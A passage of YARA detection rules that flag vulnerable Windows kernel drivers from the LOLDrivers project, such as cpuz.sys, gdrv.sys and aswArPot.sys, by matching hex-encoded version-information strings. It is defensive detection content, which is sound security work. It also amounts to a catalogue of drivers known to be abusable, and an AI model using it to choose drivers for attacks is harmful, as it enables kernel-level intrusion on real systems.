0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043005000550049004400200073006500720076006900630065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400280043002900200032003000310037002000430050005500490044 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cpuid_Cpuzsys_Cpuidservice_0E85_RID38A0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:29:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055004900440020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00430050005500490044 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003100360033003800350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043005000550049004400200073006500720076006900630065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400280043002900200032003000310036002000430050005500490044 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Wisecleanercom_Wiseunlosys_Wiseunlo_786F_RID3C89 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - WiseUnlo.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:16:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570069007300650055006e006c006f } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069007300650043006c00650061006e00650072002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0032002e00310033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0032002e00310033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00570069007300650055006e006c006f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069007300650055006e006c006f } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00570069007300650055006e006c006f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000310035 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cpuid_Cpuzsys_Cpuidservice_A397_RID38A2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:29:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055004900440020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00430050005500490044 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003100360033003800350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043005000550049004400200073006500720076006900630065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400280043002900200032003000310034002000430050005500490044 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Zemanaltd_Zam_D7E0_RID333B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - zam64.sys, zamguard32.sys, zamguard64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:39:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0041004d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a0065006d0061006e00610020004c00740064002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e00310031002e0031002e003500310030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00310031002e0031002e003500310030 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0041004d } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]005a0065006d0061006e00610020004c00740064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Cpuid_Cpuzsys_Cpuidservice_2298_RID3893 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:27:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055004900440020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00430050005500490044 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003100360033003800350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043005000550049004400200073006500720076006900630065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400280043002900200032003000310032002000430050005500490044 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Asrockincorporation_Asrdrvsys_Asrockiodriver_4D03_RID403F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AsrDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:54:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100530052006f0063006b00200049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004100530052006f0063006b00200049006e0063006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300030002e00300030002e00300030003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300030002e00300030002e0030003000300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004100730072004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100530052006f0063006b00200049004f0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004100730072004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100320020004100530052006f0063006b00200049006e0063006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Getactechnologycorporation_Mtcbsvsys_Getacsystemserviceprovider_0ABC_RID485B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - GtcKmdfBs.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:40:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00470065007400610063002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047006500740061006300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320031002c00200032002c00200030002c00200034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320031002c00200032002c00200030002c00200034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0074006300420053007600360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00470065007400610063002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004700740063004b006d0064006600420073002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020003200300031003900200047006500740061006300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Razerinc_Rzpnk_Rzpnk_D7B7_RID363E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rzpnk.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 16:47:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061007a006500720020004f007600650072006c0061007900200053007500700070006f00720074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520061007a00650072002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00310032002e00310030003100350035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00310032002e00310030003100350035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0052007a0070006e006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310030002d0032003000310037002e002000520061007a00650072002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Netfiltersys_Windowsrwinddkdriver_9DBC_RID45A3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - netfilter2.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:44:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e0065007400460069006c007400650072002000530044004b00200057004600500020004400720069007600650072002000280057005000500029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0035002e0039002e0037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0032002e0039003200300030002e00320030003500350037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020004e0065007400460069006c00740065007200530044004b002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Lgdatacatchersys_Gameacc_07FB_RID4141 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - LgDataCatcher.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:37:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c006500690067006f00640020006e006500740020006400610074006100200063006100740063006800650072002e } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004c006700440061007400610043006100740063006800650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00470061006d0065004100630063 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004c006700440061007400610043006100740063006800650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002000320030003200300020006e006e002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Innotekgmbh_Vboxguest_Virtualboxguestadditions_D53F_RID4128 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - vboxguest.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:33:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f00780020004700750065007300740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0069006e006e006f00740065006b00200047006d00620048 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0035002e0036002e00320038003200340031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0035002e0036002e00320038003200340031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00760062006f007800670075006500730074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072007400750061006c0042006f00780020004700750065007300740020004100640064006900740069006f006e0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00760062006f007800670075006500730074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300034002d003200300030003700200069006e006e006f00740065006b00200047006d00620048 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Eldoscorporation_Elrawdsksys_Rawdisk_4744_RID3CCD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elrawdsk.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:27:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200610077004400690073006b0020004400720069007600650072002e00200041006c006c006f00770073002000770072006900740065002000610063006300650073007300200074006f002000660069006c0065007300200061006e006400200072006100770020006400690073006b00200073006500630074006f0072007300200066006f0072002000750073006500720020006d006f006400650020006100700070006c00690063006100740069006f006e007300200069006e002000570069006e0064006f007700730020003200300030003000200061006e00640020006c0061007400650072002e } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c0064006f005300200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002c00200031002c002000320037002c0020003100300036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002c00200031002c002000320037002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0065006c00720061007700640073006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200610077004400690073006b } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0065006c00720061007700640073006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300037002d0032003000310031002c00200045006c0064006f005300200043006f00720070006f0072006100740069006f006e0020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Gigabytetechnologycoltd_Gdrvsys_Gigabytesoftwaredriver_81AA_RID4460 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - gdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:50:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004900470041002d00420059005400450020004e006f006e0050006e00500020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047004900470041002d004200590054004500200054004500430048004e004f004c004f0047005900200043004f002e002c0020004c00540044002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0031002e0030002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0047004900470041002d004200590054004500200053006f0066007400770061007200650020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310037 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevices_Amdryzenmasterdriversys_Amdryzenmasterservicedriver_F6CD_RID4C0C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AMDRyzenMasterDriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:17:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020003200300031003700200041004d0044002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_2594_RID465D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:15:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0033002e0033003800360030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0033002e0033003800360030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310038002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_8473_RID369F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:03:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c00200043006c00690065006e007400200050006f00720074006100620069006c0069007400790020004c0061007900650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310031 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00490043004d002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310033002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Highresolutionenterpriseswwwhighrezcouk_Inpoutsys_Inpoutdriverversion_CFAB_RID4B6D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - inpout32.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 07:51:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004b00650072006e0065006c0020006c006500760065006c00200070006f0072007400200061006300630065007300730020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0048006900670068007200650073006f006c007500740069006f006e00200045006e0074006500720070007200690073006500730020005b007700770077002e006800690067006800720065007a002e0063006f002e0075006b005d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00320020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0069006e0070006f0075007400330032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0069006e0070006f00750074003300320020004400720069007600650072002000560065007200730069006f006e00200031002e0032 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0069006e0070006f0075007400330032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300030003800200048006900670068007200650073006f006c007500740069006f006e00200045006e007400650072007000720069007300650073002e00200050006f007200740069006f006e007300200043006f007000790072006900670068007400200028006300290020004c006f00670069007800340075 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_4CD8_RID36BC : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - libnicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      